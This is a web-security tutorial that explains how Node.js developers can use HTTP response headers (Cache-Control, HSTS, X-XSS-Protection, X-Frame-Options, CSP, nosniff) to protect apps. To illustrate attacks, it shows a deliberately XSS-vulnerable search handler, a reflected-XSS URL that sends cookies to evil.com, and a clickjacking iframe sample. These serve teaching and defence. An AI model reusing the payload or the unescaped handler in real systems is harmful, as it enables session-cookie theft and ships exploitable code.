---
title: How To Secure Your Web App With HTTP Headers
slug: secure-web-app-http-headers
image: >-
  https://archive.smashing.media/assets/344dbf88-fdf9-42bb-adb4-46f01eedd629/cde0db8d-e1e4-4e38-b64f-20fdec9f6bed/laptop-coding-preview-opt.jpeg
date: 2017-04-03T18:39:31.000Z
author: hagaylupesko
description: >-
  Web applications, be they thin websites or thick single-page apps, are
  notorious targets for cyber-attacks. In 2016, approximately 40% of data
  breaches originated from attacks on web apps — the leading attack pattern.
  Indeed, these days, understanding cyber-security is not a luxury but rather
  **a necessity for web developers**, especially for developers who build
  consumer-facing applications.

  HTTP response headers can be leveraged to tighten up the security of web apps,
  typically just by adding a few lines of code. In this article, we’ll show how
  web developers can use HTTP headers to build secure apps. While the code
  examples are for Node.js, setting HTTP response headers is supported across
  all major server-side-rendering platforms and is typically simple to set up.
categories:
  - Coding
  - Security
  - Node.js
  - HTTPS
---
HTTP response headers can be leveraged to tighten up the security of web apps, typically just by adding a few lines of code. In this article, we’ll show how web developers can use HTTP headers to build secure apps. While the code examples are for Node.js, setting HTTP response headers is supported across all major server-side-rendering platforms and is typically simple to set up.</p>

### <span class="rh">Further Reading</span> on SmashingMag:

*   [Facing The Challenge: Building A Responsive Web Application](https://www.smashingmagazine.com/2013/06/building-a-responsive-web-application/)
*   [Getting Ready For HTTP2: A Guide For Web Designers And Developers](https://www.smashingmagazine.com/2016/02/getting-ready-for-http2/)
*   [Common Security Mistakes in Web Applications](https://www.smashingmagazine.com/2010/10/common-security-mistakes-in-web-applications/)
*   [Web Security: Are You Part Of The Problem?](https://www.smashingmagazine.com/2010/01/web-security-primer-are-you-part-of-the-problem/)

## About HTTP Headers

Technically, HTTP headers are simply fields, encoded in clear text, that are part of the HTTP request and response message header. They are designed to enable both the HTTP client and server to send and receive meta data about the connection to be established, the resource being requested, as well as the returned resource itself.

{{% feature-panel %}}

Plain-text HTTP response headers can be examined easily using cURL, with the <code>--head</code> option, like so:

<pre><code class="language-bash">$ curl --head https://www.google.com
HTTP/1.1 200 OK
Date: Thu, 05 Jan 2017 08:20:29 GMT
Expires: -1
Cache-Control: private, max-age=0
Content-Type: text/html; charset=ISO-8859-1
Transfer-Encoding: chunked
Accept-Ranges: none
Vary: Accept-Encoding
…</code></pre>

Today, hundreds of headers are used by web apps, some standardized by the <a href="https://www.ietf.org/">Internet Engineering Task Force</a> (IETF), the open organization that is behind many of the standards that power the web as we know it today, and some proprietary. HTTP headers provide a flexible and extensible mechanism that enables the rich and varying use cases found on the web today.</p>

## Disabling Caching Of Confidential Resources

Caching is a valuable and effective technique for optimizing performance in client-server architectures, and HTTP, which leverages caching extensively, is no exception. However, in cases where the cached resource is confidential, caching can lead to vulnerabilities — and must be avoided. As an example, consider a web app that renders and caches a page with sensitive information and is being used on a shared PC. Anyone can view confidential information rendered by that web app simply by visiting the browser’s cache, or sometimes even as easily as clicking the browser’s “back” button!

The IETF’s <a href="https://tools.ietf.org/html/rfc7234">RFC 7234</a>, which defines HTTP caching, specifies the default behavior of HTTP clients, both browsers and intermediary Internet proxies, to <em>always</em> cache responses to HTTP <code>GET</code> requests — unless specified otherwise. While this enables HTTP to boost performance and reduce network congestion, it could also expose end users to theft of personal information, as mentioned above. The good news is that the HTTP specification also defines a pretty simple way to instruct clients not to cache a given response, through the use of — you guessed it! — HTTP response headers.

There are three headers to return when you are returning sensitive information and would like to disable caching by HTTP clients:

*   `Cache-Control` This response header, introduced in HTTP 1.1, may contain one or more directives, each carrying a specific caching semantic, and instructing HTTP clients and proxies on how to treat the response being annotated by the header. My recommendation is to format the header as follows: `cache-control: no-cache, no-store, must-revalidate`. These three directives pretty much instruct clients and intermediary proxies not to use a previously cached response, not to store the response, and that even if the response is somehow cached, the cache must be revalidated on the origin server.
*   `Pragma: no-cache` For backwards-compatibility with HTTP 1.0, you will want to include this header as well. Some HTTP clients, especially intermediary proxies, still might not fully support HTTP 1.1 and so will not correctly handle the `Cache-Control` header mentioned above. Use `Pragma: no-cache` to ensure that these older clients do not cache your response.
*   `Expires: -1` This header specifies a timestamp after which the response is considered stale. By specifying `-1`, instead of an actual future time, you ensure that clients immediately treat this response as stale and avoid caching.

Note that, while disabling caching enhances the security of your web app and helps to protect confidential information, is does come at the price of a performance hit. Make sure to disable caching only for resources that actually require confidentiality and not just for any response rendered by your server! For a deeper dive into best practices for caching web resources, I highly recommend reading <a href="https://jakearchibald.com/2016/caching-best-practices/">Jake Archibald’s post</a> on the subject.

Here’s how you would program these headers in Node.js:

<pre><code class="language-javascript">function requestHandler(req, res) {
	res.setHeader('Cache-Control','no-cache,no-store,max-age=0,must-revalidate');
	res.setHeader('Pragma','no-cache');
	res.setHeader('Expires','-1');
}
</code></pre>

## Enforcing HTTPS

Today, the importance of HTTPS is widely recognized by the tech community. More and more web apps configure secured endpoints and are redirecting unsecure traffic to secured endpoints (i.e. HTTP to HTTPS redirects). Unfortunately, end users have yet to fully comprehend the importance of HTTPS, and this lack of comprehension exposes them to various man-in-the-middle (MitM) attacks. The typical user navigates to a web app without paying much attention to the protocol being used, be it secure (HTTPS) or unsecure (HTTP). Moreover, many users will just click past browser warnings when their browser presents a certificate error or warning!

The importance of interacting with web apps over a valid HTTPS connection cannot be overstated: An unsecure connection exposes the user to various attacks, which could lead to cookie theft or worse. As an example, it is not very difficult for an attacker to spoof network frames within a public Wi-Fi network and to extract the session cookies of users who are not using HTTPS. To make things even worse, even users interacting with a web app over a secured connection may be exposed to downgrade attacks, which try to force the connection to be downgraded to an unsecure connection, thus exposing the user to MitM attacks.

How can we help users avoid these attacks and better enforce the usage of HTTPS? Enter the HTTP Strict Transport Security (HSTS) header. Put simply, HSTS makes sure all communications with the origin host are using HTTPS. Specified in <a href="https://tools.ietf.org/html/rfc6797">RFC 6797</a>, HSTS enables a web app to instruct browsers to allow <em>only</em> HTTPS connections to the origin host, to internally redirect all unsecure traffic to secured connections, and to automatically upgrade all unsecure resource requests to be secure.

HSTS directives include the following:

*   `max-age=<number of seconds>` This instructs the browser to cache this header, for this domain, for the specified number of seconds. This can ensure tightened security for a long duration!
*   `includeSubDomains` This instructs the browser to apply HSTS for all subdomains of the current domain. This can be useful to cover all current and future subdomains you may have.
*   `preload` This is a powerful directive that forces browsers to _always_ load your web app securely, even on the first hit, before the response is even received! This works by hardcoding a list of HSTS preload-enabled domains into the browser’s code. To enable the preloading feature, you need to register your domain with [HSTS Preload List Submission](https://hstspreload.org), a website maintained by Google’s Chrome team. Once registered, the domain will be prebuilt into supporting browsers to always enforce HSTS. The preload directive within the HTTP response header is used to confirm registration, indicating that the web app and domain owner are indeed interested in being on the preload list.

<b>A word of caution:</b> using the <code>preload</code> directive also means it cannot be easily undone, and carries an update lead time of months! While preload certainly improves your app's security, it also means you need to be fully confident your app can support HTTPS-only!

My recommendation is to use <code>Strict-Transport-Security: max-age=31536000; includeSubDomains;</code> which instructs the browser to enforce a valid HTTPS connection to the origin host and to all subdomains for a year. If you are confident that your app can handle HTTPS-only, I would also recommend adding the <code>preload</code> directive, in which case don’t forget to register your website on the preload list as well, as noted above!

Here’s what implementing HSTS looks like in Node.js:

<pre><code class="language-javascript">function requestHandler(req, res) {
	res.setHeader('Strict-Transport-Security','max-age=31536000; includeSubDomains; preload');
}
</code></pre>

## Enabling XSS Filtering

In a reflected cross-site scripting attack (reflected XSS), an attacker injects malicious JavaScript code into an HTTP request, with the injected code “reflected” in the response and executed by the browser rendering the response, enabling the malicious code to operate within a trusted context, accessing potentially confidential information such as session cookies. Unfortunately, XSS is a pretty common web app attack, and a surprisingly effective one!

To understand a reflected XSS attack, consider the Node.js code below, rendering mywebapp.com, a mock and intentionally simple web app that renders search results alongside the search term requested by the user:

<pre><code class="language-javascript">function handleRequest(req, res) {
    res.writeHead(200);

    // Get the search term
    const parsedUrl = require('url').parse(req.url);
    const searchTerm = decodeURI(parsedUrl.query);
    const resultSet = search(searchTerm);

    // Render the document
    res.end(
        "&lt;html&gt;" +
            "&lt;body&gt;" +
                "&lt;p&gt;You searched for: " + searchTerm + "&lt;/p&gt;" +
                // Search results rendering goes here…
            "&lt;/body&gt;" +
        "&lt;/html&gt;");
};
</code></pre>

Now, consider how will the web app above handle a URL constructed with malicious executable code embedded within the URL, such as this:

<pre><code class="language-markup">https://mywebapp.com/search?&lt;/p&gt;&lt;script&gt;window.location=“https://evil.com?cookie=”+document.cookie&lt;/script&gt;</code></pre>

As you may realize, this URL will make the browser run the injected script and send the user’s cookies, potentially including confidential session cookies, to evil.com!

To help protect users against reflective XSS attacks, some browsers have implemented protection mechanisms. These mechanisms try to identify these attacks by looking for matching code patterns in the HTTP request and response. Internet Explorer was the first browser to introduce such a mechanism with its XSS filter, introduced in Internet Explorer 8 back in 2008, and WebKit later introduced XSS Auditor, available today in Chrome and Safari. (Firefox has no similar mechanism built in, but users can use add-ons to gain this functionality.) These various protection mechanisms are not perfect: They may fail to detect a real XSS attack (a false negative), and in other cases may block legitimate code (a false positive). Due to the latter, browsers allow users to disable the XSS filter via the settings. Unfortunately, this is typically a global setting, which turns off this security feature completely for all web apps loaded by the browser.

Luckily, there is a way for a web app to override this configuration and ensure that the XSS filter is turned on for the web app being loaded by the browser. This is done via the <code>X-XSS-Protection</code> header. This header, supported by Internet Explorer (from version 8), Edge, Chrome and Safari, instructs the browser to turn on or off the browser’s built-in protection mechanism and to override the browser’s local configuration.

<code>X-XSS-Protection</code> directives include these:

*   `1` or `0` This enables or disables the filter.
*   `mode=block` This instructs the browser to prevent the entire page from rendering when an XSS attack is detected.

I recommend always turning on the XSS filter, as well as block mode, to maximize user protection. Such a response header looks like this:

<pre><code class="language-markup">X-XSS-Protection: 1; mode=block</code></pre>

Here’s how you would configure this response header in Node.js:

<pre><code class="language-javascript">
function requestHandler(req, res) {
	res.setHeader('X-XSS-Protection','1;mode=block');
}
</code></pre>

## Controlling Framing

An iframe (or HTML inline frame element, if you want to be more formal) is a DOM element that allows a web app to be nested within a parent web app. This powerful element enables some important web use cases, such as embedding third-party content into web apps, but it also has significant drawbacks, such as not being SEO-friendly and not playing nice with browser navigation — the list goes on.

One of the caveats of iframes is that it makes clickjacking easier. Clickjacking is an attack that tricks the user into clicking something different than what they think they’re clicking. To understand a simple implementation of clickjacking, consider the HTML markup below, which tries to trick the user into buying a toaster when they think they are clicking to win a prize!

<pre><code class="language-markup">&lt;html&gt;
  &lt;body&gt;
    &lt;button class='some-class'&gt;Win a Prize!&lt;/button&gt;
    &lt;iframe class='some-class' style='opacity: 0;’ src='https://buy.com?buy=toaster'&gt;&lt;/iframe&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>

Clickjacking has many malicious applications, such as tricking the user into confirming a Facebook like, purchasing an item online and even submitting confidential information. Malicious web apps can leverage iframes for clickjacking by embedding a legitimate web app inside their malicious web app, rendering the iframe invisible with the <code>opacity: 0</code> CSS rule, and placing the iframe’s click target directly on top of an innocent-looking button rendered by the malicious web app. A user who clicks the innocent-looking button will trigger a click on the embedded web app — without at all knowing the effect of their click.

An effective way to block this attack is by restricting your web app from being framed. <code>X-Frame-Options</code>, specified in <a href="https://www.ietf.org/rfc/rfc7034.txt">RFC 7034</a>, is designed to do exactly that! This header instructs the browser to apply limitations on whether your web app can be embedded within another web page, thus blocking a malicious web page from tricking users into invoking various transactions on your web app. You can either block framing completely using the <code>DENY</code> directive, whitelist specific domains using the <code>ALLOW-FROM</code> directive, or whitelist only the web app’s origin using the <code>SAMEORIGIN</code> directive.

My recommendation is to use the <code>SAMEORIGIN</code> directive, which enables iframes to be leveraged for apps on the same domain — which may be useful at times — and which maintains security. This recommended header looks like this:

<pre><code class="language-markup">X-Frame-Options: SAMEORIGIN</code></pre>

Here’s an example of a configuration of this header to enable framing on the same origin in Node.js:

<pre><code class="language-javascript">function requestHandler(req, res) {
	res.setHeader('X-Frame-Options','SAMEORIGIN');
}
</code></pre>

## Explicitly Whitelisting Sources

As we’ve noted earlier, you can add in-depth security to your web app by enabling the browser’s XSS filter. However, note that this mechanism is limited, is not supported by all browsers (Firefox, for instance, does not have an XSS filter) and relies on pattern-matching techniques that can be tricked.

Another layer of in-depth protection against XSS and other attacks can be achieved by explicitly whitelisting trusted sources and operations — which is what Content Security Policy (CSP) enables web app developers to do.

CSP is a <a href="https://www.w3.org/TR/2016/WD-CSP3-20160901/">W3C specification</a> that defines a powerful browser-based security mechanism, enabling granular control over resource-loading and script execution in a web app. With CSP, you can whitelist specific domains for operations such as script-loading, AJAX calls, image-loading and style sheet-loading. You can enable or disable inline scripts or dynamic scripts (the notorious <code>eval</code>) and control framing by whitelisting specific domains for framing. Another cool feature of CSP is that it allows you to configure a real-time reporting target, so that you can monitor your app in real time for CSP blocking operations.

This explicit whitelisting of resource loading and execution provides in-depth security that in many cases will fend off attacks. For example, by using CSP to disallow inline scripts, you can fend off many of the reflective XSS attack variants that rely on injecting inline scripts into the DOM.

CSP is a relatively complex header, with a lot of directives, and I won’t go into the details of the various directives. HTML5 Rocks has a <a href="https://www.html5rocks.com/en/tutorials/security/content-security-policy/">great tutorial</a> that provides an overview of CSP, and I highly recommend reading it and learning how to use CSP in your web app.

Here’s a simple example of a CSP configuration to allow script-loading from the app’s origin only and to block dynamic script execution (<code>eval</code>) and inline scripts (as usual, on Node.js):

<pre><code class="language-javascript">function requestHandler(req, res) {
	res.setHeader('Content-Security-Policy',"script-src 'self'");
}
</code></pre>

## Preventing Content-Type Sniffing

In an effort to make the user experience as seamless as possible, many browsers have implemented a feature called content-type sniffing, or MIME sniffing. This feature enables the browser to detect the type of a resource provided as part of an HTTP response by “sniffing” the actual resource bits, regardless of the resource type declared through the <code>Content-Type</code> response header. While this feature is indeed useful in some cases, it introduces a vulnerability and an attack vector known as a MIME confusion attack. A MIME-sniffing vulnerability enables an attacker to inject a malicious resource, such as a malicious executable script, masquerading as an innocent resource, such as an image. With MIME sniffing, the browser will ignore the declared image content type, and instead of rendering an image will execute the malicious script.

Luckily, the <code>X-Content-Type-Options</code> response header mitigates this vulnerability! This header, introduced in Internet Explorer 8 back in 2008 and currently supported by most major browsers (Safari is the only major browser not to support it), instructs the browser not to use sniffing when handling fetched resources. Because <code>X-Content-Type-Options</code> was only formally specified as part of the <a href="https://fetch.spec.whatwg.org/#x-content-type-options-header">“Fetch” specification</a>, the actual implementation varies across browsers; some (Internet Explorer and Edge) completely avoid MIME sniffing, whereas others (Firefox) still MIME sniff but rather block executable resources (JavaScript and CSS) when an inconsistency between declared and actual types is detected. The latter is in line with the latest Fetch specification.

<code>X-Content-Type-Options</code> is a simple response header, with only one directive: <code>nosniff</code>. This header looks like this: <code>X-Content-Type-Options: nosniff</code>. Here’s an example of a configuration of the header:

<pre><code class="language-javascript">function requestHandler(req, res) {
	res.setHeader('X-Content-Type-Options','nosniff');
}
</code></pre>

## Summary

In this article, we have seen how to leverage HTTP headers to reinforce the security of your web app, to fend off attacks and to mitigate vulnerabilities.</p>

### Takeaways

*   Disable caching for confidential information using the `Cache-Control` header.
*   Enforce HTTPS using the `Strict-Transport-Security` header, and add your domain to Chrome’s preload list.
*   Make your web app more robust against XSS by leveraging the `X-XSS-Protection` header.
*   Block clickjacking using the `X-Frame-Options` header.
*   Leverage `Content-Security-Policy` to whitelist specific sources and endpoints.
*   Prevent MIME-sniffing attacks using the `X-Content-Type-Options` header.

Remember that for the web to be truly awesome and engaging, it has to be secure. Leverage HTTP headers to build a more secure web!

<hr />

(<strong>Disclaimer:</strong> The content of this post is my own and doesn’t represent my past or current employers in any way whatsoever.)

<em>Front page image credits: <a href="https://www.pexels.com/photo/coffee-writing-computer-blogging-34600/">Pexels.com</a>.</em>

{{< signature "da, yk, al, il" >}}

